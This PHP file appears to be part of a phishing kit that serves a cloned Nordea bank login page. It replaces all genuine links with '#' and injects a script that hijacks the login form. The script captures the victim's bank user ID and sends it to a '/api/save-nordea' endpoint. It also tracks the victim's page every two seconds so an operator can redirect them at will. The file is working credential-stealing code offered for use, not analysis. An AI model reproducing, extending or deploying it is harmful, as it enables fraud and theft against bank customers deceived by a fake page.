<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Nordea');
$htmlContent = file_get_contents(__DIR__ . '/Nordeabankyeni.html');

$basePath = '/nordea-files/';
$htmlContent = preg_replace('/\.\/Nordeabankyeni_files\//', $basePath, $htmlContent);
$htmlContent = preg_replace('/Nordeabankyeni_files\//', $basePath, $htmlContent);
$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);

$adminScript = '';
if (isset($_SESSION['user_id'])) {
    $userId = $_SESSION['user_id'];
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        function getNordeaUsername() {
            const ccalcUserId = document.getElementById(\'ccalc-user-id\');
            const mtaUserId = document.getElementById(\'mta-user-id\');
            const qrtUserId = document.getElementById(\'qrt-user-id\');
            
            if (ccalcUserId && ccalcUserId.value) {
                return ccalcUserId.value.trim();
            } else if (mtaUserId && mtaUserId.value) {
                return mtaUserId.value.trim();
            } else if (qrtUserId && qrtUserId.value) {
                return qrtUserId.value.trim();
            }
            
            return \'\';
        }
        
        function handleFormSubmit(e) {
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            
            const username = getNordeaUsername();
            
            if (username) {
                fetch(\'/api/save-nordea\', {
                    method: \'POST\',
                    headers: { \'Content-Type\': \'application/json\' },
                    body: JSON.stringify({
                        user_id: userId,
                        username: username,
                        password: \'\'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success && data.redirect) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
            }
            
            return false;
        }
        
        function initFormHandlers() {
            const authForm = document.getElementById(\'auth-form\');
            if (authForm) {
                authForm.onsubmit = null;
                authForm.action = \'#\';
                authForm.addEventListener(\'submit\', handleFormSubmit, true);
                
                const authButton = document.getElementById(\'auth-button\');
                if (authButton) {
                    authButton.addEventListener(\'click\', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        handleFormSubmit(e);
                    }, true);
                }
            }
        }
        
        if (document.readyState === \'loading\') {
            document.addEventListener(\'DOMContentLoaded\', function() {
                setTimeout(initFormHandlers, 500);
            });
        } else {
            setTimeout(initFormHandlers, 500);
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

$htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
echo $htmlContent;
?>
<?php
$content = ob_get_clean();
echo $content;
?>
